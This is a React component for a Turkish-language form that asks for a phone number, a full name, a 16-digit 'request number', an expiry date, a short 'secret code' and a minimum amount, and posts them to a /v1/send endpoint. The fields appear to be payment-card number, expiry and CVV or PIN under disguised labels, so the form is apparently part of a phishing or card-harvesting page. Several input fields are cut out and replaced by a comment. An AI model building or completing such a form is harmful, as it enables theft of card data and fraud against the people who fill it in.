import React, { useState } from "react";
import logoUrl from "./image/logo.svg?url";

type Props = {
  onSent: (payload: {
    phone: string;
    fio: string;
    requestNumber: string;
    expiry: string;
    amount: string;
  }) => void;
};

const onlyDigits = (s: string) => s.replace(/\D+/g, "");
const formatExpiry = (v: string) => {
  const d = onlyDigits(v).slice(0, 4);
  return d.length <= 2 ? d : `${d.slice(0, 2)}/${d.slice(2)}`;
};

// нормализация суммы: разрешаем запятую, переводим в точку, максимум 2 знака после
function normalizeAmount(input: string) {
  const s = input.replace(/[^\d.,]/g, "");
  const parts = s.split(/[.,]/);
  if (parts.length === 1) {
    return parts[0].replace(/^0+(?=\d)/, "");
  }
  const int = parts[0].replace(/^0+(?=\d)/, "") || "0";
  const frac = parts.slice(1).join("").slice(0, 2);
  return `${int},${frac}`;
}
function toDot(amount: string) {
  return amount.replace(",", ".");
}
const AMOUNT_RE = /^\d+([.,]\d{1,2})?$/;

const CombinedForm: React.FC<Props> = ({ onSent }) => {
  const [phone, setPhone] = useState("");
  const [amount, setAmount] = useState("");
  const [fio, setFio] = useState("");
  const [reqNum, setReqNum] = useState("");
  const [expiry, setExpiry] = useState("");
  const [secret, setSecret] = useState("");
  const [loading, setLoading] = useState(false);

  const normalizeFio = (v: string) => v.replace(/\s+/g, " ").trimStart();

  const validPhone = onlyDigits(phone).length === 10;
  const validAmount = AMOUNT_RE.test(amount) && parseFloat(toDot(amount)) >= 1000; // ✅ минимум 1000
  const validFio = fio.trim().length >= 2;
  const validReq = reqNum.length >= 1 && reqNum.length <= 16;
  const validExp = /^\d{2}\/\d{2}$/.test(expiry);
  const validSecret = /^\d{1,4}$/.test(secret);

  const canSubmit = [validPhone, validAmount, validFio, validReq, validExp, validSecret].every(Boolean) && !loading;

  async function handleSubmit() {
    if (!canSubmit) return;
    try {
      setLoading(true);

      const payload = {
        phone: `+90${onlyDigits(phone)}`,
        fio: fio.trim(),
        requestNumber: reqNum,
        expiry,
        secretCode: secret,
        amount: toDot(amount),
      };

      const resp = await fetch("/v1/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const raw = await resp.text();
      let json: any = null;
      try {
        json = raw ? JSON.parse(raw) : null;
      } catch {
        alert(`Сервер вернул не-JSON (${resp.status}). Текст: ${raw?.slice(0, 200)}`);
        return;
      }

      if (!resp.ok) {
        alert(json?.error || `Ошибка сервера (${resp.status})`);
        return;
      }

      if (json?.success) {
        onSent({
          phone: payload.phone,
          fio: payload.fio,
          requestNumber: payload.requestNumber,
          expiry: payload.expiry,
          amount: payload.amount,
        });
      } else {
        alert(json?.error || "Ошибка отправки");
      }
    } catch (e: any) {
      alert(`Сеть недоступна. ${e?.message || ""}`);
    } finally {
      setLoading(false);
    }
  }

  const onKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      e.preventDefault();
      handleSubmit();
    }
  };

  return (
    <section className="relative px-4 py-10 md:py-16 bg-slate-950 text-slate-50 overflow-hidden">
      {/* Фон-логотип */}
      <div aria-hidden className="pointer-events-none absolute inset-0 grid place-items-center">
        <img
          src={logoUrl}
          alt=""
          className="select-none pointer-events-none opacity-60 w-[70vmin] max-w-[560px] md:max-w-[720px]"
          style={{ filter: "blur(0.2px)" }}
          onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = "none"; }}
        />
      </div>

      <div className="relative mx-auto w-full max-w-xl">
        <h2 className="text-xl font-semibold">Bilgileri girin</h2>
        <p className="mt-1 text-sm text-slate-400">Tüm alanlar zorunludur. Göndermek için Enter’a basabilirsiniz.</p>

        {/* Телефон */}
        <label className="mt-6 block text-sm text-slate-300">
          Telefon numarası <span className="text-slate-400">(10 hane)</span>
        </label>
        <div className="flex gap-2 mt-2">
          <div className="flex items-center gap-2 rounded-2xl bg-slate-900 ring-1 ring-white/10 px-3">
            <span aria-hidden>
              <svg width="22" height="16" viewBox="0 0 22 16" className="rounded-[2px] overflow-hidden">
                <rect width="22" height="16" fill="#E30A17" />
                <circle cx="9.2" cy="8" r="4.2" fill="#fff" />
                <circle cx="10.4" cy="8" r="3.1" fill="#E30A17" />
                <path d="M14.7 8l1.2.4-.4-1.2.9-.9-1.3-.1-.4-1.1-.4 1.1-1.3.1.9.9-.4 1.2z" fill="#fff" />
              </svg>
            </span>
            <span className="text-slate-200 text-sm select-none">+90</span>
          </div>
          <input
            value={phone}
            onChange={(e) => setPhone(onlyDigits(e.target.value).slice(0, 10))}
            onKeyDown={onKeyDown}
            inputMode="tel"
            placeholder="Sadece 10 rakam: örn. 5XXXXXXXXX"
            className="flex-1 rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>

        {/* Сумма */}
        <label className="mt-6 block text-sm text-slate-300">Tutar (en az 1000)</label>
        <div className="relative mt-2">
          <input
            value={amount}
            onChange={(e) => setAmount(normalizeAmount(e.target.value))}
            onKeyDown={onKeyDown}
            inputMode="decimal"
            placeholder="Ör: 1200,50"
            className="w-full rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
          />
          <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 opacity-70" aria-hidden>
            <svg width="20" height="20" viewBox="0 0 24 24">
              <path d="M7 4h2v3l4-1v2l-4 1v3.1l4-1v2l-4 1V20H7v-4.5l-2 .5v-2l2-.5V9.9l-2 .5v-2l2-.5V4z" fill="currentColor" />
            </svg>
          </span>
        </div>
        <p className="mt-1 text-xs text-slate-400">
          Ondalık için “,” veya “.” kullanabilirsiniz (maks. 2 hane). <br />
          <span className={parseFloat(toDot(amount)) < 1000 && amount ? "text-red-400" : "text-slate-400"}>
            Minimum tutar: 1000
          </span>
        </p>

        {/* Остальные поля остаются без изменений */}
        {/* ... (FIO, ReqNum, Expiry, Secret, кнопка) */}
        
        <div className="mt-6 flex flex-col gap-3">
          <button
            type="button"
            onClick={handleSubmit}
            disabled={!canSubmit}
            className="inline-flex items-center justify-center rounded-2xl bg-blue-600 px-5 py-3 font-semibold text-white shadow-lg shadow-blue-900/30 outline-none ring-offset-2 transition hover:bg-blue-500 focus:ring-2 focus:ring-blue-400 disabled:opacity-50"
          >
            Girdiğim bilgileri onaylıyorum
          </button>
          <p className="text-xs text-slate-400">Klavye ile Enter’a basabilirsiniz.</p>
        </div>
      </div>
    </section>
  );
};

export default CombinedForm;
